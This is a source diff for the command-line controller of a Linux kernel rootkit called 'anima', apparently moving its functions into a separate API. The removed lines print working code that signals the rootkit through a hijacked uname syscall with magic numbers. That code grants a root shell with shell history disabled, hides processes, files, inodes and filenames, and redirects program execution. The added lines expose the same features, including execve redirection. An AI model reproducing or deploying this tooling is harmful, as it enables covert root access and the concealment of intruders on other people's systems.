@@ -2,19 +2,9 @@
 #include <stdlib.h>
 #include <string.h>
 #include <getopt.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-#include <sys/stat.h>
 
 #include <anima/anima_ctl.h>
-
-#define warn(fmt, ...) fprintf(stderr, fmt"\n", ##__VA_ARGS__)
-
-static inline void set_magics(struct rk_args *args)
-{
-	args->magic_number_1 = MAGIC_NUMBER_1;
-	args->magic_number_2 = MAGIC_NUMBER_2;
-}
+#include "anima_api.h"
 
 static struct option long_options[] = {
 	{"hide-inode", 1, 0, 0},
@@ -43,153 +33,11 @@ void usage(const char *path)
 		"\t--unhide-file <path>\tunhide file\n"			\
 		"\t--hide-filename <name>\thide filename\n"		\
 		"\t--unhide-filename <name>\tunhide filename\n"		\
+		"\t--redirect-execve <path:new_path>\t redirect exexve\n"\
+		"\t--unredirect-execve <path:new_path>\t unredirect execve\n"\
 		"\t--debug-rk\t\t(for debugging purpose)\n"		\
 		"\t--debug-stats\t\t(for debugging purpose)\n"		\
 		, path);
-}
-
-void root_shell(void)
-{
-	struct rk_args args;
-	char *argv[] = { "/bin/sh", NULL };
-	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null",
-			"history=/dev/null" };
-
-	set_magics(&args);
-	args.mode = GET_ROOT;
-	syscall(SYS_uname, &args);
-	execve(argv[0], argv, env);
-}
-
-long get_inode(const char *path)
-{
-	struct stat st;
-
-	if (stat(path, &st) < 0)
-		return -1;
-
-	return st.st_ino;
-}
-
-void hide_file(const char *path)
-{
-	long ino;
-	struct rk_args args;
-
-	ino = get_inode(path);
-	if (ino < 0) {
-		warn("unable to hide file %s", path);
-		return;
-	}
-
-	set_magics(&args);
-	args.mode = SYSCALL_HIDE_INODE;
-	args.param1 = ino;
-	syscall(SYS_uname, &args);
-}
-
-void unhide_file(const char *path)
-{
-	long ino;
-	struct rk_args args;
-
-	ino = get_inode(path);
-	if (ino < 0) {
-		warn("unable to unhide file");
-		return;
-	}
-
-	set_magics(&args);
-	args.mode = SYSCALL_UNHIDE_INODE;
-	args.param1 = ino;
-	syscall(SYS_uname, &args);
-}
-
-void hide_pid(pid_t pid)
-{
-	struct rk_args args;
-	char proc_path[64];
-
-	set_magics(&args);
-	args.mode = SYSCALL_HIDE_PID;
-	args.param1 = atoi(optarg);
-	syscall(SYS_uname, &args);
-
-	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
-	hide_file(proc_path);
-	snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
-	hide_file(proc_path);
-
-}
-
-void unhide_pid(pid_t pid)
-{
-	struct rk_args args;
-	char proc_path[64];
-
-	set_magics(&args);
-	args.mode = SYSCALL_UNHIDE_PID;
-	args.param1 = atoi(optarg);
-	syscall(SYS_uname, &args);
-
-	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
-	unhide_file(proc_path);
-	snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
-	unhide_file(proc_path);
-}
-
-void hide_filename(const char *name)
-{
-	struct rk_args args;
-
-	set_magics(&args);
-	args.mode = VFS_HIDE_FILE;
-	args.p_param1 = (void *)name;
-	args.param2 = strlen(name);
-	syscall(SYS_uname, &args);
-}
-
-void unhide_filename(const char *name)
-{
-	struct rk_args args;
-
-	set_magics(&args);
-	args.mode = VFS_UNHIDE_FILE;
-	args.p_param1 = (void *)name;
-	args.param2 = strlen(name);
-	syscall(SYS_uname, &args);
-}
-
-void redirect_execve(char *path)
-{
-	struct rk_args args;
-	char *old_path, *new_path;
-
-	old_path = path;
-	new_path = strchr(path, ':');
-	if (!new_path)
-		return;
-	*new_path = 0;
-	new_path++;
-
-	set_magics(&args);
-	args.mode = SYSCALL_REDIRECT_EXECVE;
-	args.p_param1 = old_path;
-	args.param2 = strlen(old_path);
-	args.p_param3 = new_path;
-	args.param4 = strlen(new_path);
-	syscall(SYS_uname, &args);
-}
-
-void unredirect_execve(char *path)
-{
-	struct rk_args args;
-
-	set_magics(&args);
-	args.mode = SYSCALL_UNREDIRECT_EXECVE;
-	args.p_param1 = path;
-	args.param2 = strlen(path);
-	syscall(SYS_uname, &args);
 }
 
 int main(int argc, char **argv)
@@ -199,7 +47,6 @@ int main(int argc, char **argv)
 
 	for (;;) {
 		memset(&args, 0, sizeof(args));
-		set_magics(&args);
 		c = getopt_long(argc, argv, "h", long_options, &opt_idx);
 		if (c == -1)
 			break;
@@ -209,14 +56,10 @@ int main(int argc, char **argv)
 			usage(argv[0]);
 			return 0;
 		case 0:
-			args.mode = SYSCALL_HIDE_INODE;
-			args.param1 = atoi(optarg);
-			syscall(SYS_uname, &args);
+			hide_inode(atoi(optarg));
 			break;
 		case 1:
-			args.mode = SYSCALL_UNHIDE_INODE;
-			args.param1 = atoi(optarg);
-			syscall(SYS_uname, &args);
+			unhide_inode(atoi(optarg));
 			break;
 		case 2:
 			root_shell();
@@ -246,12 +89,10 @@ int main(int argc, char **argv)
 			unredirect_execve(optarg);
 			break;
 		case 11:
-			args.mode = DEBUG_RK;
-			syscall(SYS_uname, &args);
+			anima_control(DEBUG_RK, NULL);
 			break;
 		case 12:
-			args.mode = DEBUG_STATS;
-			syscall(SYS_uname, &args);
+			anima_control(DEBUG_STATS, NULL);
 			break;
 		default:
 			break;
